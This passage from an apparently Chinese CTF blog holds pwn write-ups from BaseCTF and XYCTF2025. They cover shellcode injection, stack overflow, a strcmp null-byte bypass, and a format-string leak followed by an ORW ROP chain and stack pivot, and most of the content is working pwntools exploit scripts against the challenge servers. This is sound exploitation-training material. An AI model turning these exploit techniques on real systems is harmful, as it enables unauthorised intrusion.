class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>注意：send()与sendline()的区别，send会直接将指定的数据发送到连接的另一端不会添加任何额外字符，sendline会在发送完数据后自动加上一个换行符。使用send传shellcode防止其被破坏。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;challenge.basectf.fun&#x27;</span>,<span class="number">47287</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">b&#x27;\x0f\x05&#x27;</span> <span class="comment">#\x0f\x05  是系统调用，用来停止这个这次输入</span></span><br><span class="line">p.send(shellcode)</span><br><span class="line">shellcode1 = <span class="string">b&#x27;\x90&#x27;</span>*<span class="number">2</span>+asm(shellcraft.sh())  <span class="comment">#\x90 是nop 为了覆盖之前的syscall</span></span><br><span class="line">p.sendline(shellcode1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="简单的签到（随机数）"><a href="#简单的签到（随机数）" class="headerlink" title="简单的签到（随机数）"></a>简单的签到（随机数）</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>简单的执行接收数据后返回，搞懂程序运行逻辑即可得解</p><p>checksec</p><p><img src="/../images/jk2024/%E7%AE%80%E5%8D%95%E7%9A%84%E7%AD%BE%E5%88%B01.png" alt="1"></p><p>IDA分析</p><p>程序逻辑很简单，首先生成两个随机数，需要我们在3秒内计算并返回乘积，返回正确即可获得shell</p><p>运行程序发现开始会输出一串字符，提示按Enter开始挑战，回车后出现两个数相乘</p><p><img src="/../images/jk2024/%E7%AE%80%E5%8D%95%E7%9A%84%E7%AD%BE%E5%88%B02.png" alt="1"></p><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>首先利用recv()接收之前的无用数据</p><p>利用sendline()传入一个换行符模拟回车</p><p>由于输出的数字乘积题目为字符串，需特定接收数字并将其转换为整型，利用recvuntil()接收数字并加int将其转换为整型供后续使用</p><p>将数据计算后利用str转换为字符串再利用sendline()传入最后获得shell</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.send(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">a = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;*&#x27;</span>,drop = <span class="literal">True</span>)) <span class="comment">#这行代码使用io.recvuntil()函数来读取直到遇到特定字符序列（在这个例子中是&#x27; * &#x27;）为止的数据。</span></span><br><span class="line"><span class="comment">#&#x27;drop=True&#x27;参数表示在返回结果时不包含这个特定的结束符。</span></span><br><span class="line">b = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;=&#x27;</span>,drop = <span class="literal">True</span>))</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="built_in">str</span>(a * b))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="你会栈溢出吗"><a href="#你会栈溢出吗" class="headerlink" title="你会栈溢出吗"></a>你会栈溢出吗</h1><p>简单的64位栈溢出，注意别忘了堆栈平衡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./stackover&#x27;</span>)</span><br><span class="line">lea=<span class="number">0x40073D</span></span><br><span class="line">backdoor=<span class="number">0x400744</span></span><br><span class="line">paylode=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">12</span>+<span class="number">8</span>)+p64(lea)+p64(backdoor)</span><br><span class="line"></span><br><span class="line">io.sendline(paylode)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="000000-随机数"><a href="#000000-随机数" class="headerlink" title="000000(随机数)"></a>000000(随机数)</h1><h2 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h2><p>程序保护全开主要逻辑是通过从&#x2F;dev&#x2F;urand设备文件中读取随机数据来作为密码，接着获取输入，将输入数据与password利用strcmp函数进行对比，输入数据正确即可获得flag</p><p><img src="/../images/jk2024/000000.png" alt="1"></p><h2 id="思路："><a href="#思路：" class="headerlink" title="思路："></a>思路：</h2><p>密码有128位，爆破不太现实，strcmp函数当检测到<code>\0</code>后结束比较</p><blockquote><p>通过<code>/dev/urandom</code>生成的随机数的每一位数据实际上是一个字节（8位），其值的范围是从0到255（即0x00到0xFF）。这是因为一个字节可以表示256个不同的值（2^8）。因此，对于通过该代码生成的随机数的第一位数据，有256种可能的值。这包括了从0到255的所有整数，涵盖了所有的ASCII控制字符、可打印字符以及其他非打印字符。每次从<code>/dev/urandom</code>读取时，每一位都是独立且随机的，因此每个可能的字节值出现的概率是相等的。</p></blockquote><p>有1&#x2F;256的概率第一位是<code>\x00</code>即<code>\0</code>字符，故发送一个字符<code>\0</code>进行循环尝试</p><h2 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&#x27;./main&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">debug = 0</span></span><br><span class="line"><span class="string">if debug:</span></span><br><span class="line"><span class="string">    io = remote(&#x27;nc1.ctfplus.cn&#x27;, 27912)</span></span><br><span class="line"><span class="string">else:</span></span><br><span class="line"><span class="string">    io = process(filename)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line"></span><br><span class="line">context(arch = elf.arch, log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(io)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    io = process(filename)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        io.sendline(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">        io.recvuntil(<span class="string">&#x27;&#123;&#x27;</span>, timeout = <span class="number">0.3</span>)</span><br><span class="line">        io.interactive()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        io.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>赛题合集</title>
      <link href="/2025/04/05/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/"/>
      <url>/2025/04/05/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="国内比赛"><a href="#国内比赛" class="headerlink" title="国内比赛"></a>国内比赛</h1><h2 id="XYCTF2025"><a href="#XYCTF2025" class="headerlink" title="XYCTF2025"></a>XYCTF2025</h2><h3 id="girlfirend"><a href="#girlfirend" class="headerlink" title="girlfirend"></a>girlfirend</h3><p>check发现保护全开，有菜单但是似乎不是堆题</p><p>发现有<code>system(&quot;echo /flag&quot;); </code>但是没有&#x2F;bin&#x2F;sh</p><p>解析各个选择</p><p>1：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">lll1</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">56</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( dword_4094 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You have already tried to talk to her, and she left...&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    dword_4094 = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Girl is very beautiful!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;what do you want to say to her?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x50</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You say: %s\n&quot;</span>, buf);               <span class="comment">// 泄露canary或者libc</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;but she left.........&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现有栈溢出漏洞，<del>后接printf可以利用该处输出canary的值</del>，因为canary的低字节一般是\x00会将%s截断<del>但是不确定在调用另一个函数后该值是否发生改变</del>Canary 值在程序运行时是固定的，不会随着函数调用而改变。</p><p>2：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">get_flag2</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you want to buy her flowers?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Y/N&quot;</span>);</span><br><span class="line">  v1 = getchar();</span><br><span class="line">  <span class="keyword">while</span> ( getchar() != <span class="number">10</span> )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( v1 == <span class="string">&#x27;Y&#x27;</span> || v1 == <span class="string">&#x27;y&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( dword_4090 &lt;= <span class="number">200</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;you don&#x27;t have enough money&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You did it!\n&quot;</span>);</span><br><span class="line">      system(<span class="string">&quot;echo /flag&quot;</span>);                     <span class="comment">// 拿flag</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;what a pity!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关键函数，如果输入Y且dword_4090&gt;200即可到达system函数，但是此处不能直接输出flag或者提权也没有&#x2F;bin&#x2F;sh想尝试将其参数传为&#x2F;bin&#x2F;sh</p><p>3：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">lll3</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( dword_4098 &lt;= <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    ++dword_4098;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You should tell her your name first&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;your name:&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You also get her name: XM&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Good luck!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can only introduce yourself twice.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数也存在溢出可用其修改dword_4090的值使其能运行到system函数，存在格式化字符串漏洞，可以把&#x2F;bin&#x2F;sh写到bss段用该处泄露基地址(因为开了PIE bss段的地址无法确定)</p><p>4没啥用</p><p>开了沙箱：</p><p>注意在调用read时fd也就是第一个参数只能等于0所以得先用close(0)关闭标准输入，使得在read(0,xxx,xxx)时文件指针0能够重定向到opeanat()所打开的那个文件使得flag正常读入</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/xy1.png" alt="1"></p><p>大致思路目前是这样的，首先利用3测格式化字符的偏移尝试输出elf基地址绕过PIE，输出canary，输出函数真实地址拿到libc，接着利用3构造rop链因为没有&#x2F;bin&#x2F;sh且禁用了execve所以选择用orw，但是opean也被禁用了但可以用opeanat代替，最后用1进行栈迁移到利用3布置的rop链上</p><p>注意在开启了PIE之后gdb调试时无法直接在main函数处下断点需要借助<code>b *$rebase(要下断点的偏移)</code>当然得先让程序跑起来，ida中显示的地址即为偏移</p><p>canary：</p><p>printf处存在格式化字符漏洞，可以通过输入改变printf调用时rdi的值也就是格式字符串，printf的格式字符串防在rdi中，后续对应的参数前5个放在寄存器里，也就是<code>RSI RDX RCX R8 R9</code>后续参数存放到栈上由低地址到高地址。</p><p>调用printf函数时的寄存器情况以及栈情况：</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/XY3.png" alt="1"></p><p>可以发现rdi成功变成了我们输入的格式字符，RSI RDX R8 R9中的内容都没有我们想要的那么看栈上的</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/Snipaste_2025-04-10_09-18-39.png" alt="1"></p><p>可以发现第7个参数是mov edi，1的地址可以用这个泄露elf基地址，我们用泄露出来的地址减去该汇编对应偏移就是基地址</p><p>IDA中找到该条汇编，偏移为0x18D9</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/Snipaste_2025-04-10_09-37-08.png" alt="1"></p><p>第15个很明显是canary的值因为低字节是’\x00’，为什么确定canary是该处的值呢我们调用1再来看看栈上确定该canary</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/Snipaste_2025-04-10_09-25-28.png" alt="1"></p><p>这里运行到1中获取输入后，可以看到栈上0x7fffffffdfc8对应的值即为canary，因为其在rbp-8处</p><p>ibc基址我们选择用第17个参数也就是(__libc_start_call_main+128)的地址先输出一次获取后三位，再通过网址寻找对应libc版本。注意我们只能用__libc_start_call_main搜所以要将得到的后三位减去128</p><p><img src="/../images/%E8%B5%9B%E9%A2%98%E5%90%88%E9%9B%86/Snipaste_2025-04-10_19-25-47.png" alt="1"></p><p>故为0xD90-128&#x3D;0xD10搜索到实际为这个<a href="https://libc.blukat.me/?q=__libc_start_call_main:D10&l=libc-2.40.9000-23.fc42.i686">libc database search</a></p><p>但是此处找libc基址反而是用的mov edi,eax这条指令的偏移来找的，我尝试用__libc_start_call_main的偏移来定基地址但是打不通，怪怪的，而<code>mov edi,eax</code>我用ROPgadget去找没找到只有用IDA打开libc文件一个个去试试出来其对应偏移为0x29D90</p><p>所以我们的格式字符即为<code>%7$p_%15$p_%17$p</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">io.sendlineafter(<span class="string">&quot;Your Choice:\n&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;You should tell her your name first&quot;</span>,<span class="string">b&#x27;%7$p...%15$p...%17$p...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\nyour name:\n&#x27;</span>)</span><br><span class="line">elf_base = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;...&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">0x18D9</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;pie&gt;&gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(elf_base).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">canary = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;...&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;canary&gt;&gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(canary).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;...&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">0x29D90</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;libc&gt;&gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接着再次用3来构造rop链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">payload = flat([</span><br><span class="line">    <span class="string">&#x27;flag\x00\x00\x00\x00&#x27;</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,pop_rdi_ret,</span><br><span class="line">    <span class="number">0</span>,close_addr,</span><br><span class="line">    pop_rdi_ret,-<span class="number">100</span>,</span><br><span class="line">    pop_rsi_ret,bss_addr,</span><br><span class="line">    pop_rdx_r_ret,<span class="number">0x0</span>,<span class="number">0</span>,</span><br><span class="line">    opnat_addr,</span><br><span class="line">    pop_rdi_ret,<span class="number">0</span>,</span><br><span class="line">    pop_rdx_r_ret,<span class="number">0x100</span>,<span class="number">0</span>,</span><br><span class="line">    read_addr,</span><br><span class="line">    pop_rdi_ret,<span class="number">1</span>,</span><br><span class="line">    pop_rdx_r_ret,<span class="number">0x100</span>,<span class="number">0</span>,</span><br><span class="line">    pop_rax_ret,<span class="number">1</span>,</span><br><span class="line">    write_addr,</span><br><span class="line">    ])</span><br></pre></td></tr></table></figure><p>首先将’flag’填充到8个字节压到byte_4060处后面的6个零是为了不将关键ROP覆盖到那几个bss段上的全局变量上防止后面运行不起来，加上flag总共0x38个字节，接着就是orw</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">close(0)</span><br><span class="line">opeanat(-100,bss_addr,0) //-100表示当前工作目录</span><br><span class="line">read(0,bss_addr,0x100)</span><br><span class="line">write(1,bss_addr,0x100)</span><br></pre></td></tr></table></figure><p>注意rop链刚好100字节不能用sendline发送会多一个字节，所以我们都使用send发送</p><p>最后就是栈迁移了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x38</span> + p64(canary) + p64(bss_addr+<span class="number">0x30</span>)+p64(leave_ret)</span><br></pre></td></tr></table></figure><p>因为迁移后rsp会在rbp基础上+8所以rbp只设置为bss_addr+0x30</p><p>2025-4-10浮现了7-8个小时第一次浮现出全保护的题并且全部搞懂非常开心~~</p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;gz.imxbt.cn&#x27;</span>,<span class="number">20623</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc2.so&quot;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;Your Choice:\n&quot;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">io.sendlineafter(<span class="string">&quot;You should tell her your name first&quot;</span>,<span class="string">b&#x27;%7$p...%15$p...%17$p...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\nyour name:\n&#x27;</span>)</span><br><span class="line">elf_base = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;...&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">0x18D9</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;pie&gt;&gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(elf_base).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">canary = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;...&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) </span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;canary&gt;&gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(canary).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;...&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">0x29D90</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">b&#x27;libc&gt;&gt;&gt;&#x27;</span>+<span class="built_in">hex</span>(libc_base).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bss_addr = elf_base + <span class="number">0x004060</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span><span class="comment">#: pop rdi; ret;</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x0000000000130202</span><span class="comment">#: pop rsi; ret;</span></span><br><span class="line">pop_rdx_r_ret = libc_base + <span class="number">0x000000000011f2e7</span><span class="comment">#: pop rdx; pop r12; ret; </span></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span><span class="comment">#: pop rax; ret; </span></span><br><span class="line">pop_rcx_ret = libc_base + <span class="number">0x000000000003d1ee</span><span class="comment">#: pop rcx; ret;</span></span><br><span class="line">syscall_ret = libc_base + <span class="number">0x0000000000091316</span><span class="comment">#: syscall; ret;</span></span><br><span class="line">leave_ret = libc_base + <span class="number">0x000000000004da83</span><span class="comment">#: leave; ret; </span></span><br><span class="line">opnat_addr = libc_base + libc.sym[<span class="string">&#x27;openat&#x27;</span>]</span><br><span class="line">read_addr = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_addr = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">close_addr = libc_base + libc.sym[<span class="string">&#x27;close&#x27;</span>] </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    <span class="string">&#x27;flag\x00\x00\x00\x00&#x27;</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>,pop_rdi_ret,</span><br><span class="line">    <span class="number">0</span>,close_addr,</span><br><span class="line">    pop_rdi_ret,-<span class="number">100</span>,</span><br><span class="line">    pop_rsi_ret,bss_addr,</span><br><span class="line">    pop_rdx_r_ret,<span class="number">0x0</span>,<span class="number">0</span>,</span><br><span class="line">    opnat_addr,</span><br><span class="line">    pop_rdi_ret,<span class="number">0</span>,</span><br><span 